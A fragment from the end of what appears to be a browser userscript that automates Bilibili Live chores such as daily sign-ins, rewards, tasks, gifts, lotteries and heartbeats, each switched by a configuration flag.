            if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
            if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
            if (CONFIG.MOBILE_HEARTBEAT) {
                //MobileHeartbeat.run();
                WebHeartbeat.run();
            }
            //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
            // 每过一定时间一次
            if (CONFIG.AUTO_TASK) Task.run();
            if (CONFIG.AUTO_GIFT) Gift.run();
            // 持续运行
            //if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
            if (CONFIG.AUTO_LOTTERY) Lottery.run();
            RafflePorcess.run();
            TopRankTask.run();
            HeartGift.run();
            BiliPush.run();
        };

        $(document).ready(() => {
            Init().then(Run);
        });
    }
})();
